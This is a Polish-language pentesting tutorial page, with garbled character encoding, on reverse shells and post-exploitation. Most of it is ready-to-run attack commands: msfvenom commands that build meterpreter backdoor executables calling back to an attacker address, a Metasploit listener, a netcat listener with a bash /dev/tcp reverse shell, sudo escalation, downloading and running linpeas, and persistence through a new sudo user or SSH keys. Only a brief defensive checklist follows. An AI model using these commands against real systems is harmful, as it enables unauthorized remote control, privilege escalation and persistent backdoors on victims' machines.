---
id: "reverse-shell-post-exploitation"
title: "ğŸ­ Reverse Shell i Post-Exploitation"
sidebar_position: 14
---

# ğŸ­ Reverse Shell i Post-Exploitation

Po udanym przejÄ™ciu systemu atakujÄ…cy moÅ¼e chcieÄ‡ utrzymaÄ‡ dostÄ™p, przechwyciÄ‡ dane, wykonaÄ‡ dalsze eskalacje uprawnieÅ„ lub zainstalowaÄ‡ backdoora. W tej sekcji omÃ³wimy, jak tworzyÄ‡ **reverse shell**, przejmowaÄ‡ sesje oraz utrwalaÄ‡ dostÄ™p do systemu.

---

## ğŸ› ï¸ Tworzenie backdoora
Backdoor to ukryte wejÅ›cie do systemu, ktÃ³re pozwala atakujÄ…cemu na ponowne zalogowanie siÄ™ bez wiedzy administratora.

### **1ï¸âƒ£ Tworzenie backdoora w Metasploit**
Metasploit umoÅ¼liwia generowanie zÅ‚oÅ›liwych plikÃ³w wykonywalnych:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```
JeÅ›li atakowany system to Linux:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > backdoor.elf
```

#### **Uruchomienie backdoora**
Na maszynie atakujÄ…cego uruchamiamy listener w Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```
Po otwarciu pliku `backdoor.exe` przez ofiarÄ™, uzyskujemy zdalny dostÄ™p do systemu.

---

## ğŸ”„ Przechwytywanie sesji
Reverse Shell pozwala na peÅ‚nÄ… interakcjÄ™ z systemem ofiary.

### **2ï¸âƒ£ Uzyskanie Reverse Shell przez Netcat**
AtakujÄ…cy otwiera listener:
```bash
nc -lvnp 4444
```
Ofiara uruchamia payload:
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
Po uruchomieniu polecenia, atakujÄ…cy uzyskuje interaktywnÄ… powÅ‚okÄ™.

### **3ï¸âƒ£ Eskalacja uprawnieÅ„**
Po uzyskaniu dostÄ™pu do systemu moÅ¼na sprÃ³bowaÄ‡ podnieÅ›Ä‡ uprawnienia:
```bash
sudo -l
```
JeÅ›li istnieje dostÄ™p do `sudo` bez hasÅ‚a, moÅ¼na wykonaÄ‡:
```bash
sudo /bin/bash
```
W przypadku Linuksa moÅ¼na uÅ¼yÄ‡ narzÄ™dzia `linpeas` do wykrycia potencjalnych wektorÃ³w eskalacji:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### **4ï¸âƒ£ Utrwalanie dostÄ™pu**
Po uzyskaniu dostÄ™pu atakujÄ…cy moÅ¼e dodaÄ‡ konto uÅ¼ytkownika:
```bash
sudo useradd -m -s /bin/bash hacker
sudo passwd hacker
sudo usermod -aG sudo hacker
```
Lub dodaÄ‡ klucz SSH do `~/.ssh/authorized_keys`, aby uzyskaÄ‡ trwaÅ‚y dostÄ™p.

---

## ğŸ” Jak zabezpieczyÄ‡ system przed backdoorami i reverse shell?
âœ… **Monitorowanie aktywnoÅ›ci sieciowej i nietypowego ruchu na nietypowych portach**
âœ… **Blokowanie Netcata i innych narzÄ™dzi uÅ¼ywanych w atakach**
âœ… **UÅ¼ywanie EDR (Endpoint Detection & Response) do wykrywania podejrzanych dziaÅ‚aÅ„**
âœ… **Regularne skanowanie systemÃ³w pod kÄ…tem nowych uÅ¼ytkownikÃ³w i kluczy SSH**
âœ… **Ograniczenie uprawnieÅ„ i segmentacja sieci**

---

Reverse Shell i Post-Exploitation to kluczowe elementy zaawansowanego pentestingu. Kolejnym krokiem bÄ™dzie **Ataki na uwierzytelnianie wieloskÅ‚adnikowe (2FA Bypass)**! ğŸš€
